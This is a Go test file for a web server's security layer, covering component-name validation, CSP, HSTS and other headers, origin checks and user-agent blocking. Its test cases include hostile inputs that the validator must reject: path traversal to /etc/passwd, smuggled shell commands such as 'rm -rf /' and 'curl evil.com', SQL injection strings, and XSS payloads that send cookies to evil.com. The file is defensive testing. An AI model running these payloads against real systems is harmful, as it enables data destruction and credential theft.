package server

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/conneroisu/templar/internal/config"
	"github.com/conneroisu/templar/internal/validation"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestValidateComponentName_Security tests component name validation security.
func TestValidateComponentName_Security(t *testing.T) {
	tests := []struct {
		name          string
		componentName string
		expectError   bool
		errorType     string
	}{
		{
			name:          "valid component name",
			componentName: "Button",
			expectError:   false,
		},
		{
			name:          "valid camelCase name",
			componentName: "MyComponent",
			expectError:   false,
		},
		{
			name:          "valid with numbers",
			componentName: "Button123",
			expectError:   false,
		},
		{
			name:          "empty component name",
			componentName: "",
			expectError:   true,
			errorType:     "empty",
		},
		{
			name:          "path traversal attempt",
			componentName: "../../../etc/passwd",
			expectError:   true,
			errorType:     "path traversal",
		},
		{
			name:          "absolute path attempt",
			componentName: "/etc/passwd",
			expectError:   true,
			errorType:     "absolute path",
		},
		{
			name:          "path separator in name",
			componentName: "components/Button",
			expectError:   true,
			errorType:     "path separators",
		},
		{
			name:          "script injection attempt",
			componentName: "<script>alert('xss')</script>",
			expectError:   true,
			errorType:     "dangerous character",
		},
		{
			name:          "sql injection attempt",
			componentName: "'; DROP TABLE components; --",
			expectError:   true,
			errorType:     "dangerous character",
		},
		{
			name:          "command injection attempt",
			componentName: "Button; rm -rf /",
			expectError:   true,
			errorType:     "dangerous character",
		},
		{
			name:          "shell metacharacter pipe",
			componentName: "Button | cat /etc/passwd",
			expectError:   true,
			errorType:     "dangerous character",
		},
		{
			name:          "shell metacharacter ampersand",
			componentName: "Button & curl evil.com",
			expectError:   true,
			errorType:     "dangerous character",
		},
		{
			name:          "shell metacharacter backtick",
			componentName: "Button`whoami`",
			expectError:   true,
			errorType:     "dangerous character",
		},
		{
			name:          "shell metacharacter dollar",
			componentName: "Button$(malicious)",
			expectError:   true,
			errorType:     "dangerous character",
		},
		{
			name:          "excessive length name",
			componentName: strings.Repeat("A", 101), // Over 100 char limit
			expectError:   true,
			errorType:     "too long",
		},
		{
			name:          "maximum allowed length",
			componentName: strings.Repeat("A", 100), // Exactly 100 chars
			expectError:   false,
		},
		{
			name:          "quote injection attempt",
			componentName: "Button\"malicious\"",
			expectError:   true,
			errorType:     "dangerous character",
		},
		{
			name:          "single quote injection",
			componentName: "Button'malicious'",
			expectError:   true,
			errorType:     "dangerous character",
		},
		{
			name:          "backslash attempt",
			componentName: "Button\\malicious",
			expectError:   true,
			errorType:     "dangerous character",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateComponentName(tt.componentName)

			if tt.expectError {
				assert.Error(t, err, "Expected error for test case: %s", tt.name)
				if tt.errorType != "" {
					assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
						"Error should contain expected type: %s", tt.errorType)
				}
			} else {
				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
			}
		})
	}
}

// TestSecurityRegression_NoPathTraversal verifies path traversal is prevented.
func TestSecurityRegression_NoPathTraversal(t *testing.T) {
	// Test cases based on common path traversal patterns
	pathTraversalAttempts := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
		"/./../../../etc/passwd",
		"/./../../etc/passwd",
		"../../../../../../etc/passwd",
		"..//////../../../etc/passwd",
		"../\\..\\/..\\etc/passwd",
	}

	for _, attempt := range pathTraversalAttempts {
		t.Run("Prevent: "+attempt, func(t *testing.T) {
			err := validateComponentName(attempt)
			assert.Error(t, err, "Path traversal should be prevented: %s", attempt)
		})
	}
}

// TestSecurityRegression_NoXSSInjection verifies XSS injection is prevented.
func TestSecurityRegression_NoXSSInjection(t *testing.T) {
	xssAttempts := []string{
		"<script>alert('xss')</script>",
		"<img src=x onerror=alert('xss')>",
		"<svg onload=alert('xss')>",
		"<iframe src=javascript:alert('xss')>",
		"<body onload=alert('xss')>",
		"<div onclick=alert('xss')>",
		"javascript:alert('xss')",
		"<script>document.location='http://evil.com/'+document.cookie</script>",
		"<img src='x' onerror='fetch(\"http://evil.com/\"+document.cookie)'>",
	}

	for _, attempt := range xssAttempts {
		t.Run("Prevent: "+attempt, func(t *testing.T) {
			err := validateComponentName(attempt)
			assert.Error(t, err, "XSS injection should be prevented: %s", attempt)
		})
	}
}

// TestSecurityRegression_NoSQLInjection verifies SQL injection patterns are blocked.
func TestSecurityRegression_NoSQLInjection(t *testing.T) {
	sqlInjectionAttempts := []string{
		"'; DROP TABLE components; --",
		"' OR '1'='1",
		"' UNION SELECT * FROM users --",
		"'; INSERT INTO admin VALUES ('hacker', 'password'); --",
		"' OR 1=1 --",
		"admin'--",
		"admin'/*",
		"' OR 'x'='x",
		"' AND 1=0 UNION SELECT password FROM users WHERE username='admin'--",
	}

	for _, attempt := range sqlInjectionAttempts {
		t.Run("Prevent: "+attempt, func(t *testing.T) {
			err := validateComponentName(attempt)
			assert.Error(t, err, "SQL injection should be prevented: %s", attempt)
		})
	}
}

// Security Middleware Tests

func TestSecurityMiddleware_DefaultHeaders(t *testing.T) {
	config := DefaultSecurityConfig()
	middleware := SecurityMiddleware(config)

	handler := middleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/test", nil)
	w := httptest.NewRecorder()

	handler.ServeHTTP(w, req)

	// Check security headers
	assert.Equal(t, "DENY", w.Header().Get("X-Frame-Options"))
	assert.Equal(t, "nosniff", w.Header().Get("X-Content-Type-Options"))
	assert.Equal(t, "1; mode=block", w.Header().Get("X-XSS-Protection"))
	assert.Equal(t, "strict-origin-when-cross-origin", w.Header().Get("Referrer-Policy"))
	assert.Equal(t, "off", w.Header().Get("X-DNS-Prefetch-Control"))
	assert.Equal(t, "noopen", w.Header().Get("X-Download-Options"))
	assert.Equal(t, "none", w.Header().Get("X-Permitted-Cross-Domain-Policies"))
	assert.Equal(t, "require-corp", w.Header().Get("Cross-Origin-Embedder-Policy"))
	assert.Equal(t, "same-origin", w.Header().Get("Cross-Origin-Opener-Policy"))
	assert.Equal(t, "same-origin", w.Header().Get("Cross-Origin-Resource-Policy"))

	// Check CSP header exists and contains expected directives
	csp := w.Header().Get("Content-Security-Policy")
	assert.NotEmpty(t, csp)
	assert.Contains(t, csp, "default-src 'self'")
	assert.Contains(t, csp, "object-src 'none'")
	assert.Contains(t, csp, "frame-ancestors 'none'")
}

func TestSecurityMiddleware_CSP_BuildHeader(t *testing.T) {
	tests := []struct {
		name     string
		csp      *CSPConfig
		expected []string
	}{
		{
			name: "basic CSP",
			csp: &CSPConfig{
				DefaultSrc: []string{"'self'"},
				ScriptSrc:  []string{"'self'", "'unsafe-inline'"},
				ObjectSrc:  []string{"'none'"},
			},
			expected: []string{
				"default-src 'self'",
				"script-src 'self' 'unsafe-inline'",
				"object-src 'none'",
			},
		},
		{
			name: "CSP with upgrade and block directives",
			csp: &CSPConfig{
				DefaultSrc:              []string{"'self'"},
				UpgradeInsecureRequests: true,
				BlockAllMixedContent:    true,
				RequireSRIFor:           []string{"script", "style"},
			},
			expected: []string{
				"default-src 'self'",
				"upgrade-insecure-requests",
				"block-all-mixed-content",
				"require-sri-for script style",
			},
		},
		{
			name: "CSP with report directives",
			csp: &CSPConfig{
				DefaultSrc: []string{"'self'"},
				ReportURI:  "/csp-report",
				ReportTo:   "csp-endpoint",
			},
			expected: []string{
				"default-src 'self'",
				"report-uri /csp-report",
				"report-to csp-endpoint",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			header := buildCSPHeader(tt.csp, "")

			for _, expected := range tt.expected {
				assert.Contains(t, header, expected)
			}
		})
	}
}

func TestSecurityMiddleware_HSTS(t *testing.T) {
	tests := []struct {
		name     string
		hsts     *HSTSConfig
		expected string
	}{
		{
			name: "basic HSTS",
			hsts: &HSTSConfig{
				MaxAge: 31536000,
			},
			expected: "max-age=31536000",
		},
		{
			name: "HSTS with subdomains",
			hsts: &HSTSConfig{
				MaxAge:            31536000,
				IncludeSubDomains: true,
			},
			expected: "max-age=31536000; includeSubDomains",
		},
		{
			name: "HSTS with preload",
			hsts: &HSTSConfig{
				MaxAge:            31536000,
				IncludeSubDomains: true,
				Preload:           true,
			},
			expected: "max-age=31536000; includeSubDomains; preload",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			header := buildHSTSHeader(tt.hsts)
			assert.Equal(t, tt.expected, header)
		})
	}
}

func TestSecurityMiddleware_XSSProtection(t *testing.T) {
	tests := []struct {
		name     string
		xss      *XSSProtectionConfig
		expected string
	}{
		{
			name: "disabled XSS protection",
			xss: &XSSProtectionConfig{
				Enabled: false,
			},
			expected: "0",
		},
		{
			name: "basic XSS protection",
			xss: &XSSProtectionConfig{
				Enabled: true,
			},
			expected: "1",
		},
		{
			name: "XSS protection with block mode",
			xss: &XSSProtectionConfig{
				Enabled: true,
				Mode:    "block",
			},
			expected: "1; mode=block",
		},
		{
			name: "XSS protection with report mode",
			xss: &XSSProtectionConfig{
				Enabled:   true,
				Mode:      "report",
				ReportURI: "/xss-report",
			},
			expected: "1; report=/xss-report",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			header := buildXSSProtectionHeader(tt.xss)
			assert.Equal(t, tt.expected, header)
		})
	}
}

func TestSecurityMiddleware_PermissionsPolicy(t *testing.T) {
	pp := &PermissionsPolicyConfig{
		Geolocation: []string{},
		Camera:      []string{"'self'"},
		Microphone:  []string{"'self'", "https://example.com"},
		Fullscreen:  []string{"'self'"},
	}

	header := buildPermissionsPolicyHeader(pp)

	assert.Contains(t, header, "geolocation=()")
	assert.Contains(t, header, "camera=('self')")
	assert.Contains(t, header, "microphone=('self' https://example.com)")
	assert.Contains(t, header, "fullscreen=('self')")
}

func TestSecurityMiddleware_BlockedUserAgents(t *testing.T) {
	config := &SecurityConfig{
		BlockedUserAgents: []string{"BadBot", "Malicious Scanner"},
	}
	middleware := SecurityMiddleware(config)

	handler := middleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	tests := []struct {
		name      string
		userAgent string
		expected  int
	}{
		{
			name:      "allowed user agent",
			userAgent: "Mozilla/5.0 (compatible; Googlebot/2.1)",
			expected:  http.StatusOK,
		},
		{
			name:      "blocked user agent - exact match",
			userAgent: "BadBot/1.0",
			expected:  http.StatusForbidden,
		},
		{
			name:      "blocked user agent - partial match",
			userAgent: "Malicious Scanner v2.0",
			expected:  http.StatusForbidden,
		},
		{
			name:      "blocked user agent - case insensitive",
			userAgent: "badbot/1.0",
			expected:  http.StatusForbidden,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/test", nil)
			req.Header.Set("User-Agent", tt.userAgent)
			w := httptest.NewRecorder()

			handler.ServeHTTP(w, req)

			assert.Equal(t, tt.expected, w.Code)
		})
	}
}

func TestSecurityMiddleware_OriginValidation(t *testing.T) {
	config := &SecurityConfig{
		AllowedOrigins: []string{"https://example.com", "http://localhost:3000"},
	}
	middleware := SecurityMiddleware(config)

	handler := middleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	tests := []struct {
		name     string
		method   string
		origin   string
		referer  string
		expected int
	}{
		{
			name:     "GET request - no origin validation",
			method:   http.MethodGet,
			origin:   "https://malicious.com",
			expected: http.StatusOK,
		},
		{
			name:     "POST request - valid origin",
			method:   http.MethodPost,
			origin:   "https://example.com",
			expected: http.StatusOK,
		},
		{
			name:     "POST request - invalid origin",
			method:   http.MethodPost,
			origin:   "https://malicious.com",
			expected: http.StatusForbidden,
		},
		{
			name:     "POST request - valid referer fallback",
			method:   http.MethodPost,
			origin:   "",
			referer:  "http://localhost:3000/page",
			expected: http.StatusOK,
		},
		{
			name:     "POST request - invalid referer fallback",
			method:   http.MethodPost,
			origin:   "",
			referer:  "https://malicious.com/page",
			expected: http.StatusForbidden,
		},
		{
			name:     "OPTIONS request - no origin validation",
			method:   http.MethodOptions,
			origin:   "https://malicious.com",
			expected: http.StatusOK,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(tt.method, "/test", nil)
			if tt.origin != "" {
				req.Header.Set("Origin", tt.origin)
			}
			if tt.referer != "" {
				req.Header.Set("Referer", tt.referer)
			}
			w := httptest.NewRecorder()

			handler.ServeHTTP(w, req)

			assert.Equal(t, tt.expected, w.Code)
		})
	}
}

func TestSecurityMiddleware_DevelopmentConfig(t *testing.T) {
	config := DevelopmentSecurityConfig()

	// Development should use nonces instead of unsafe directives
	assert.True(t, config.EnableNonce)
	assert.NotContains(t, config.CSP.ScriptSrc, "'unsafe-eval'")
	assert.NotContains(t, config.CSP.ScriptSrc, "'unsafe-inline'")
	assert.Equal(t, "SAMEORIGIN", config.XFrameOptions)
	assert.Contains(t, config.AllowedOrigins, "http://localhost:8080")
	assert.Equal(t, 5000, config.RateLimiting.RequestsPerMinute)
}

func TestSecurityMiddleware_ProductionConfig(t *testing.T) {
	config := ProductionSecurityConfig()

	// Production should be strict
	assert.Equal(t, []string{"'self'"}, config.CSP.ScriptSrc)
	assert.Equal(t, []string{"'self'"}, config.CSP.StyleSrc)
	assert.True(t, config.CSP.UpgradeInsecureRequests)
	assert.True(t, config.CSP.BlockAllMixedContent)
	assert.Equal(t, "DENY", config.XFrameOptions)
	assert.Equal(t, []string{"'none'"}, config.CSP.FrameAncestors)
	assert.Equal(t, 100, config.RateLimiting.RequestsPerMinute)
	assert.True(t, config.HSTS.Preload)
}

func TestSecurityConfigFromAppConfig(t *testing.T) {
	tests := []struct {
		name        string
		environment string
		expectFunc  func(*testing.T, *SecurityConfig)
	}{
		{
			name:        "development environment",
			environment: "development",
			expectFunc: func(t *testing.T, sc *SecurityConfig) {
				assert.NotContains(t, sc.CSP.ScriptSrc, "'unsafe-eval'")
				assert.True(t, sc.EnableNonce)
				assert.Equal(t, "SAMEORIGIN", sc.XFrameOptions)
			},
		},
		{
			name:        "production environment",
			environment: "production",
			expectFunc: func(t *testing.T, sc *SecurityConfig) {
				assert.Equal(t, []string{"'self'"}, sc.CSP.ScriptSrc)
				assert.Equal(t, "DENY", sc.XFrameOptions)
				assert.True(t, sc.HSTS.Preload)
			},
		},
		{
			name:        "unknown environment defaults",
			environment: "staging",
			expectFunc: func(t *testing.T, sc *SecurityConfig) {
				assert.Equal(t, "DENY", sc.XFrameOptions)
				assert.False(t, sc.HSTS.Preload)
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &config.Config{
				Server: config.ServerConfig{
					Environment: tt.environment,
				},
			}

			secConfig := SecurityConfigFromAppConfig(cfg)
			require.NotNil(t, secConfig)

			tt.expectFunc(t, secConfig)
		})
	}
}

func TestGetClientIP(t *testing.T) {
	tests := []struct {
		name       string
		headers    map[string]string
		remoteAddr string
		expected   string
	}{
		{
			name: "X-Forwarded-For header",
			headers: map[string]string{
				"X-Forwarded-For": "203.0.113.1, 198.51.100.1, 192.0.2.1",
			},
			remoteAddr: "127.0.0.1:8080",
			expected:   "203.0.113.1",
		},
		{
			name: "X-Real-IP header",
			headers: map[string]string{
				"X-Real-IP": "203.0.113.1",
			},
			remoteAddr: "127.0.0.1:8080",
			expected:   "203.0.113.1",
		},
		{
			name:       "RemoteAddr fallback",
			headers:    map[string]string{},
			remoteAddr: "203.0.113.1:8080",
			expected:   "203.0.113.1",
		},
		{
			name:       "RemoteAddr without port",
			headers:    map[string]string{},
			remoteAddr: "203.0.113.1",
			expected:   "203.0.113.1",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/test", nil)
			req.RemoteAddr = tt.remoteAddr

			for key, value := range tt.headers {
				req.Header.Set(key, value)
			}

			ip := getClientIP(req)
			assert.Equal(t, tt.expected, ip)
		})
	}
}

func TestIsBlockedUserAgent(t *testing.T) {
	blockedAgents := []string{"BadBot", "Scanner", "Malicious"}

	tests := []struct {
		name      string
		userAgent string
		expected  bool
	}{
		{
			name:      "empty user agent",
			userAgent: "",
			expected:  false,
		},
		{
			name:      "allowed user agent",
			userAgent: "Mozilla/5.0 (compatible; Googlebot/2.1)",
			expected:  false,
		},
		{
			name:      "blocked user agent - exact match",
			userAgent: "BadBot",
			expected:  true,
		},
		{
			name:      "blocked user agent - partial match",
			userAgent: "BadBot/1.0",
			expected:  true,
		},
		{
			name:      "blocked user agent - case insensitive",
			userAgent: "scanner v2.0",
			expected:  true,
		},
		{
			name:      "blocked user agent - contains blocked term",
			userAgent: "Some Malicious Tool",
			expected:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validation.ValidateUserAgent(tt.userAgent, blockedAgents)
			result := err != nil // blocked if validation returns error
			assert.Equal(t, tt.expected, result)
		})
	}
}

func BenchmarkSecurityMiddleware(b *testing.B) {
	config := DefaultSecurityConfig()
	middleware := SecurityMiddleware(config)

	handler := middleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/test", nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; TestBot)")

	b.ResetTimer()
	b.ReportAllocs()

	for range b.N {
		w := httptest.NewRecorder()
		handler.ServeHTTP(w, req)
	}
}

func BenchmarkCSPHeaderBuild(b *testing.B) {
	csp := &CSPConfig{
		DefaultSrc:     []string{"'self'"},
		ScriptSrc:      []string{"'self'", "'unsafe-inline'", "'unsafe-eval'"},
		StyleSrc:       []string{"'self'", "'unsafe-inline'"},
		ImgSrc:         []string{"'self'", "data:", "blob:"},
		ConnectSrc:     []string{"'self'", "ws:", "wss:"},
		FontSrc:        []string{"'self'"},
		ObjectSrc:      []string{"'none'"},
		FrameAncestors: []string{"'none'"},
		BaseURI:        []string{"'self'"},
		FormAction:     []string{"'self'"},
	}

	b.ResetTimer()
	b.ReportAllocs()

	for range b.N {
		_ = buildCSPHeader(csp, "")
	}
}
